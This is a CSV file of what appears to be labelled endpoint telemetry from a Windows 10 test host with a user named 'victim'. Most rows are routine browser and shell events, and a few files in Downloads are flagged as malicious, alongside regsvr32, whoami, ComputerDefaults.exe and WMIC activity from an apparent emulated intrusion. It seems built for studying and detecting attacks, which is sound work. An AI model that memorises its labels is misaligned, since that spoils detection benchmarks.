5c285c65-b7c5-4a81-80ba-5fc866104182,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\bd6879be-6202-4f56-a24c-6688c28b0fc9.tmp'},777,False,1,1,2,1,1,2
a41ea6a0-20a3-4f95-ab40-7f09eeed39aa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF16d825.TMP'},779,False,2,0,2,2,0,2
b3c7aa9e-ec28-44f6-b966-f9c910940268,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Microsoft Edge.lnk'},834,False,2,0,2,2,0,2
405279a9-0023-432e-a08c-2aeb9cf743ce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\AvailabilityDB\\LOG.old~RF16fb7b.TMP'},850,False,2,0,2,2,0,2
73725b90-0c9d-429c-bab3-05f823debe67,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\AvailabilityDB\\LOG'},851,False,1,1,2,1,1,2
165c22ef-3959-4fe0-bdc7-1618ef17dc6b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\EventDB\\LOG.old~RF16fb8b.TMP'},854,False,2,0,2,2,0,2
e4944f48-aceb-4dc2-8e33-0608fdb65b57,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\EventDB\\LOG'},855,False,1,1,2,1,1,2
e98a368a-aba4-4383-9eb4-cc023804784b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\d424dc51-adbc-4e64-9cf9-fbf404d87547.tmp'},866,False,1,1,2,1,1,2
ce25d7ac-835d-4f26-adc2-98ad395fa845,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF17030d.TMP'},867,False,2,0,2,2,0,2
a4d5a451-6895-46db-b2cb-e9c61c4bb45a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\index-dir\\temp-index'},871,False,1,1,2,1,1,2
6b48f328-3424-4d8a-a9b0-b28a70e823e0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\index-dir\\the-real-index~RF170cd1.TMP'},873,False,2,0,2,2,0,2
f4d57a1b-cb93-4eb9-9ef4-9b4a38477b3f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\index-dir\\temp-index'},876,False,1,1,2,1,1,2
c0330498-0a64-46f6-87e1-8be3f60b37fa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\index-dir\\the-real-index~RF17127e.TMP'},878,False,2,0,2,2,0,2
bc99bec2-8042-48dc-936f-1aa9173f9bbd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\index.txt.tmp'},879,False,1,1,2,1,1,2
3784b10d-516c-4c48-aa2a-a9838a7553e7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\index.txt~RF1712ad.TMP'},881,False,2,0,2,2,0,2
2e688ca1-f014-4108-ab8d-f7edc2a01e62,{'file': 'C:\\Users\\victim\\Downloads\\a17893ed-5cd8-4018-9083-46190bf774d6.tmp'},884,False,1,1,2,1,1,2
34c42dd4-ab9c-49e1-b889-50e9dbfde99a,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\5f7b5f1e01b83767.automaticDestinations-ms'},892,False,2,0,2,2,0,2
768043f8-7808-4567-ab25-d35ae5605372,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\30eac91c-4915-4962-8c0e-a9a4d2599c50.tmp'},908,False,1,1,2,1,1,2
accaf1c2-aca8-467a-8d8a-7f3968e08378,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF171bf4.TMP'},909,False,2,0,2,2,0,2
61b130db-d669-4e1e-8be7-cf1aaaacc502,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\3b4649fa-38bf-4004-a9ae-29fc9306f13b.tmp'},911,False,1,1,2,1,1,2
42db6f0d-732a-4a58-8bad-2fc845267396,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF172328.TMP'},913,False,2,0,2,2,0,2
637499a9-c1ff-4436-b763-cc0067cd9010,{'file': 'C:\\Users\\victim\\Downloads\\REASONABLE_GRASS.dll'},915,True,2,0,2,2,0,2
822fbb63-4783-4f44-a7e5-0193784a74e2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\f4a62931-8e7b-472b-b6c2-8d49a61701f6.tmp'},917,False,1,1,2,1,1,2
d07034da-6947-4b6b-8f90-04a79fec19d2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF172d3a.TMP'},918,False,2,0,2,2,0,2
d9bc8be7-487d-4eaa-a288-b4349255cf80,{'file': 'C:\\Windows\\System32\\UIAutomationCore.dll'},920,False,2,0,2,2,0,2
d55f3873-2499-4ea4-ba20-b6a2c8fd7675,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\5697c638-013d-40d3-a4eb-37d7e0e4954f.tmp'},922,False,1,1,2,1,1,2
45f8d164-99ac-429a-abc6-406a9f8843a6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF1746bd.TMP'},923,False,2,0,2,2,0,2
be76826d-4d98-4226-8ead-3050c5bfb134,{'file': 'C:\\Windows\\system32\\acppage.dll'},927,False,2,0,2,2,0,2
f3f5fc18-8d89-4063-8d82-dd4a255da0a5,{'file': 'C:\\Windows\\System32\\consent.exe'},936,False,1,0,1,2,0,2
5ff59143-6991-46f9-bbba-330a10f399ce,{'file': 'C:\\Windows\\media\\Windows User Account Control.wav'},938,False,1,0,1,2,0,2
7829d9cc-c227-41c0-b10d-3bdf8da51c32,{'file': 'Cmder.exe'},946,False,1,0,1,2,0,2
50e15a94-68b0-4b5a-b31d-4a254ae19570,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo   ""'}",991,False,0,2,2,0,2,2
f9950cd5-39eb-490a-bf51-e06c184541e2,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd"" ""'}",1047,False,0,2,2,0,2,2
3e49229e-8859-49e3-beb3-eaf8f805fc47,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps""""'}",1052,False,0,2,2,0,2,2
348d770b-8f70-4e9b-b6ec-765608eca7fb,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps""""'}",1054,False,0,2,2,0,2,2
c70d291e-6230-424e-9884-1fb300ade748,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\mingw64\\bin"" ""'}",1056,False,0,2,2,0,2,2
7f3897bf-193e-44c8-86ae-188c6d005ea4,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps""""'}",1059,False,0,2,2,0,2,2
231d5d7a-1f94-4f20-8f76-4d89ff31e859,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps""""'}",1061,False,0,2,2,0,2,2
3dd3dc64-c0ad-4224-81f2-921b1fbc80ac,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\usr\\bin"" ""'}",1063,False,0,2,2,0,2,2
a280ebce-9223-45f6-a5ba-118016b50d53,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1065,False,0,2,2,0,2,2
99c8f056-406c-45af-b883-b602de08f0b6,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1067,False,0,2,2,0,2,2
d0b9c9dc-fa6a-43f9-b5a5-3039a75a7b4b,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\bin"" ""'}",1080,False,0,2,2,0,2,2
ad9b3963-b205-4c67-952a-363f9b396a31,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1082,False,0,2,2,0,2,2
4c530f35-0ffe-4dbc-b3d5-7a99684874c0,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1084,False,0,2,2,0,2,2
723d8e1f-bab8-4a22-91ad-59a808a1cff6,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\bin""  2>NUL""'}",1086,False,0,2,2,0,2,2
7023d27a-9504-46e6-b7ae-ea64f4f47eb3,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder"" ""'}",1088,False,0,2,2,0,2,2
895c807c-244e-4f6e-bb6b-bd21a1b071b0,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1090,False,0,2,2,0,2,2
e33d9209-5aa6-40fb-82ba-66ef3f98abd1,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1092,False,0,2,2,0,2,2
73d8d082-a166-4f3f-ab88-e918444567af,{'subject': 'C:\\Windows\\system32\\cmd.exe /c dir /b *.bat *.cmd 2>nul'},1094,False,0,2,2,0,2,2
a2d93da7-9e53-4ff3-b590-35e3fcaf9e16,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c ""VER""'}",1108,False,0,2,2,0,2,2
ea61732b-8836-4ff4-804a-bd5b264975f4,{'file': 'C:\\Users\\Public\\Desktop\\Microsoft Edge.lnk'},1146,False,2,0,2,2,0,2
d0224df5-548d-4dc8-a867-d8bdd16bb436,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\0c274b59-3375-4909-97d5-de3e1748b7d9.tmp'},1286,False,1,1,2,1,1,2
14819279-caa9-40b4-b848-2d956a131846,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF17687e.TMP'},1288,False,2,0,2,2,0,2
3ef80046-39cc-4da5-b53e-bb9ce6c4a798,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\b75419e0-dcaa-4a6a-8534-8a4c9b1cefa7.tmp'},1686,False,1,1,2,1,1,2
92e1e8c6-af47-4644-a250-bbf2a96388ed,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF177445.TMP'},1687,False,2,0,2,2,0,2
edb3c915-26bf-4b4b-a68c-8847fa162414,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\Caches\\{3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000014.db'},1713,False,1,0,1,2,0,2
d49621b1-0de0-4f3e-a43b-1e81b305ae81,{'file': 'C:\\Windows\\system32\\regsvr32.exe'},1776,False,2,0,2,2,0,2
8221a047-6b06-4327-97e1-40ce8f94f168,{'file': 'C:\\Windows\\System32\\regsvr32.exe'},1779,False,2,0,2,2,0,2
71a7fec3-d768-4498-af92-cd2bce53be4e,{'file': 'C:\\Windows\\system32\\whoami.exe'},1782,False,2,0,2,2,0,2
9488880a-04c7-4565-ad9b-e4fbcad31563,{'file': 'whoami.exe'},1784,False,2,0,2,2,0,2
aefbd212-3e5c-4d6a-a522-b868013b32e8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\16e5c9fe-aad9-4d55-b4d1-5d7ba8708385.tmp'},1795,False,1,1,2,1,1,2
9cd3b3aa-a2b6-4fc2-8de7-3addfa69d00d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF180d49.TMP'},1796,False,2,0,2,2,0,2
b5b308fd-e0b6-44e1-be9f-ad3d34ba444c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\5fe4c778-3323-4461-98e8-092437483df9.tmp'},1797,False,1,1,2,1,1,2
5a9f2fb8-8a74-4a82-a4bc-af17f8a1383b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF18502e.TMP'},1798,False,2,0,2,2,0,2
0fc8dd37-670e-41e6-af8f-55735cf89165,{'file': 'C:\\Users\\victim\\Downloads\\13cc0aaa-4b65-42bd-90f7-0c0858f52462.tmp'},2349,False,1,1,2,1,1,2
96cb0946-55e8-4118-b6c0-093820d85a28,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\bed63da0-941c-45dd-bf5f-655fbf7ed5ee.tmp'},2696,False,1,1,2,1,1,2
b59551df-c860-40be-94f8-80b46f82a930,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF19c375.TMP'},2698,False,2,0,2,2,0,2
651b90c9-8c78-4379-9517-b8172abbbcc1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\971d25e3-5e7c-4eef-a6fc-ac8308c0698b.tmp'},2700,False,1,1,2,1,1,2
514c9b2d-5cb8-4c0e-ae8d-05e506d74656,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF19ce43.TMP'},2701,False,2,0,2,2,0,2
0967b257-93e5-4ba2-a896-2b6ef46b3322,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\77e58d5c-1d10-437f-a3eb-aa37e545d03d.tmp'},2702,False,1,1,2,1,1,2
d651ad41-a648-466c-8d8a-a71070018e07,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF19d509.TMP'},2703,False,2,0,2,2,0,2
dc2ce64f-3ae7-4b87-9723-d8f8518eaea8,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},2721,False,0,1,1,0,2,2
495eb045-5d06-4c2a-a11e-2a93181fa6e6,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},2729,False,0,1,1,0,2,2
6ea59f49-9f18-4070-9f87-15406ea35498,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\fe8bbea6-9018-46ce-b499-7b024b6113a5.tmp'},5472,False,1,1,2,1,1,2
ed214224-9d3b-43a0-bfc7-7ba2945e2285,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF1acc1b.TMP'},5474,False,2,0,2,2,0,2
126ab297-4569-49b3-bf3a-a2ec1177ceef,{'file': 'C:\\Users\\victim\\Desktop\\x64\\powershelloutput\\20260306\\PowerShell_transcript.WIN10-BASIC-TAR.yEDuFSSZ.20260306203019.txt'},7129,False,2,0,2,2,0,2
7569a665-a3ff-4143-8fd2-18efeaa5a442,{'file': 'C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Management\\v4.0_3.0.0.0__31bf3856ad364e35\\Microsoft.PowerShell.Commands.Management.dll'},7177,False,2,0,2,2,0,2
f2351948-080d-422f-b2b9-dfc9d0440001,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\a5071d8b-110e-4457-b915-e0d2aaf8e6cc.tmp'},7215,False,1,1,2,1,1,2
d402adfa-b7ec-4b74-bbce-ce711a83f09c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF1b0d89.TMP'},7217,False,2,0,2,2,0,2
113daecb-6d98-40ef-b071-163a84ca157c,{'file': 'C:\\Users\\victim\\Desktop\\x64\\powershelloutput\\20260306\\PowerShell_transcript.WIN10-BASIC-TAR.+ESFgenD.20260306203021.txt'},7249,False,2,0,2,2,0,2
a88c9705-5c3a-4945-887b-0063b31d836b,{'file': 'C:\\Users\\victim\\Desktop\\x64\\powershelloutput\\20260306\\PowerShell_transcript.WIN10-BASIC-TAR.YukTKqqD.20260306203022.txt'},7361,False,2,0,2,2,0,2
b7f6298e-71b1-4050-8807-ab3455d43475,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\bb18e1d6-0b6d-4753-a703-80783310ab8f.tmp'},7646,False,1,1,2,1,1,2
1cf698e8-4afa-47e7-8cff-5169ac0f1e1d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF1b2efc.TMP'},7647,False,2,0,2,2,0,2
2fe1035a-1eec-42dd-9770-f35ae855c70d,{'file': 'C:\\Users\\victim\\Desktop\\x64\\powershelloutput\\20260306\\PowerShell_transcript.WIN10-BASIC-TAR.7pFSTsYx.20260306203035.txt'},8136,False,2,0,2,2,0,2
4b8b39b7-d83e-4a15-8391-b35d27981637,{'file': 'C:\\Users\\victim\\Desktop\\x64\\powershelloutput\\20260306\\PowerShell_transcript.WIN10-BASIC-TAR.UH6I4Qev.20260306203036.txt'},8283,False,2,0,2,2,0,2
c631a70c-7e85-4168-bb73-ae984a4f24ae,{'file': 'C:\\Users\\victim\\Desktop\\x64\\powershelloutput\\20260306\\PowerShell_transcript.WIN10-BASIC-TAR.K+IIk4xW.20260306203038.txt'},8396,False,2,0,2,2,0,2
055ba94c-b316-4f60-9d76-7c6cc0409c46,{'file': 'C:\\Users\\victim\\Desktop\\x64\\powershelloutput\\20260306\\PowerShell_transcript.WIN10-BASIC-TAR.bkfsuEZZ.20260306203039.txt'},8499,False,2,0,2,2,0,2
1be30263-1d13-4310-8567-6ed65a850551,{'file': 'C:\\Windows\\System32\\ComputerDefaults.exe'},8554,False,2,0,2,2,0,2
e04abbd5-bc0e-4ec3-ad9f-22f8476edfff,{'file': 'ComputerDefaults.exe'},8556,False,2,0,2,2,0,2
6bd8f874-a639-4a60-bee1-3699c31d98c1,"{'subject': '""C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe"" '}",8568,True,0,2,2,0,2,2
0fc879d2-0ed8-412d-9c82-efd8855f9311,{'file': 'PERFECT_AGLET.exe'},8569,True,2,0,2,2,0,2
9415ba0e-728f-4160-b95b-3c0ac65ed638,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\c9bf9c0c-9391-4804-84aa-a77db543007a.tmp'},9028,False,1,1,2,1,1,2
73ebe065-9343-41e2-9e26-d1137c481a09,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF1b6b49.TMP'},9029,False,2,0,2,2,0,2
ab770c80-6179-4723-8c6b-01ebe98da07b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\f8dd6e43-f309-4c92-b11c-8186e742e337.tmp'},9414,False,1,1,2,1,1,2
3e076fe9-09a0-44cd-874e-b903795e0af9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF1b7c41.TMP'},9415,False,2,0,2,2,0,2
dafac7c0-d807-4dc3-90f9-80595355e391,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},9965,False,0,1,1,0,2,2
cc08e7e1-c54b-4791-8301-7fbf988bc48b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\b9731262-a163-4c1d-80ed-33dc9bdc6a15.tmp'},10007,False,1,1,2,1,1,2
b4ca23b5-5278-4ad2-b75c-1db031dfae88,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF1ba71a.TMP'},10008,False,2,0,2,2,0,2
cfe7832e-0c7a-4154-890a-4a1072ff55a9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\1f53c9ec-a02a-44c3-b006-d9febf670ef6.tmp'},10082,False,1,1,2,1,1,2
6315fac4-dfad-41c4-b845-6f6a23c408c5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF1bb10c.TMP'},10083,False,2,0,2,2,0,2
b1d61c37-4e7b-4116-be76-afba7dfdbb5b,{'file': 'C:\\Windows\\Prefetch\\CONSENT.EXE-65F6206D.pf'},10419,False,1,0,1,2,0,2
9878a60a-bd31-4da8-950f-5661a2114759,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\876963dd-d3b6-423d-a1e2-11e0b781a5a9.tmp'},10484,False,1,1,2,1,1,2
af78ae19-8482-420b-8505-f464bb0d5f30,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF1bf922.TMP'},10485,False,2,0,2,2,0,2
b229abb9-df6b-42a4-b4a8-49bf133f78b9,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools\\Command Prompt.lnk'},10501,False,2,0,2,2,0,2
1d99b342-14c7-4ca6-a88c-ac5baed5a5d1,{'file': 'C:\\Windows\\System32\\wbem\\WMIC.exe'},10647,False,2,0,2,2,0,2
c005f8d8-3c83-41d9-aadf-d92c4b68965b,{'file': 'WMIC.exe'},10649,False,2,0,2,2,0,2
27e3daad-c4cf-4c46-9872-5ed5282abb6a,{'file': 'C:\\Windows\\System32\\Wbem\\WMIC.exe'},10650,False,2,0,2,2,0,2
948c017c-a609-4e49-a086-f1bd23373473,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\wdmaud.drv'},288,False,1,0,1,1,0,1
ba74ac65-4834-4a3c-acfb-3a68fb096eba,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\msacm32.drv'},289,False,1,0,1,1,0,1
4d9aa94a-fc35-4728-bf88-d3f023f9bbf1,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\bthprops.cpl'},290,False,1,0,1,1,0,1
